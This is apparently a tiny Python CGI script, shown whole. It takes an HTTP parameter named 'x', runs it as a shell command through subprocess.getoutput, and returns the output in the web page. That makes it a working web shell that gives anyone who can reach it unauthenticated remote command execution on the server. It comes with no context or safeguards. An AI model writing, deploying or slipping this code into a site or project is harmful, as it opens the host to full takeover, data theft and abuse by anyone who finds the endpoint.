#! /usr/bin/python3
import cgi
import time
import subprocess


print("Content-type: text/html ")
print()



f = cgi.FieldStorage()
cmd = f.getvalue('x')

o = subprocess.getoutput(cmd)
print(o)